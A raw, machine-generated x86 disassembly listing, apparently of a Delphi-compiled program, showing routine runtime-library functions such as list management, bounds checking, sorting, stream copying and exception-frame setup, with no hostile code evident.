mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41a8dc
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ba0c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a924
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a92b
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
sub_41a930
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a9cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419f98
xor eax eax
push ebp
push sub_41a9b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41b4f4
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_404208
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a9b7
mov eax [ ebp - 0x4 ]
call sub_41a054
retn
sub_41a9dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41aa7d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aa84
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov eax [ ebp - 0x4 ]
call sub_419f98
xor eax eax
push ebp
push sub_41aa60
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a054
retn
sub_41aa8c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41aac4
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ab68
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41d878
mov eax [ ebp - 0x4 ]
call sub_419f98
xor eax eax
push ebp
push sub_41ab43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41c914
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41e518
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ab4a
mov eax [ ebp - 0x4 ]
call sub_41a054
retn
sub_41ab74
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ba0c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41abbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41abc6
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
sub_41abcc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ac19
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41b758
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ac20
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_41ac2c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_405ad0
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41ac60
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41aca3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404310
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41acaa
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_41acb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ad64
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419f98
xor edx edx
push ebp
push sub_41ad47
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad4e
mov eax [ ebp - 0x4 ]
call sub_41a054
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404208
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41ad74
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41adea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41faac
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41fab4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41adf1
lea eax [ ebp - 0xc ]
call sub_404118
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_421220
inc esi
dec ebx
jne r-xdata
sub_41ae28
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x5 ]
jne r-xdata
or [ esi + 0x4 ] 0x1
mov [ esi + 0x5 ] bl
test [ esi + 0x4 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
sub_41ae44
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x6 ]
jne r-xdata
or [ esi + 0x4 ] 0x2
mov [ esi + 0x6 ] bl
test [ esi + 0x4 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
sub_41ae84
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41aea0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419dc8
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404bb4
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_41af08
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41a14c
jmp r-xdata
sub_41afa4
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404bb4
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41afe4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a14c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404ca0
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41b050
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a14c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_41a14c
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41b0ac
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41b0ac
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41b0d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41b148
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a14c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_40416c
pop edi
pop esi
pop ebx
retn
sub_41b184
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a14c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41b1ac
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41b1e0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a718
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41b22c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41a14c
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a14c
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41b280
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41b1ac
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_40416c
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028e8
sub_41b2f8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41a14c
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a14c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_40416c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41b354
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a14c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41b394
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b0ac
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b394
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41b444
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41b4a0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41b394
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41b4f4
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41b528
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41b58c
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41b5e0
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_40326c
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
mov esp ebp
pop ebp
retn
sub_41b62c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_403264
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41b5e0
pop ecx
mov eax [ ebx ]
call sub_4032a8
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41b5e0
pop ecx
sub_41b6b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41b720
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
sub_41b758
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
sub_41b790
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41b514
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026ec
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41b86c
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b873
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_40270c
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41b720
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41b758
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41b884
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c09c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41b8d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41e0d0
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b8db
mov eax [ ebp - 0x8 ]
call sub_40331c
retn
sub_41b8ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c09c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b93c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41f864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b943
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
sub_41b948
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41b9a4
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_40896c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41b9e4
push ebp
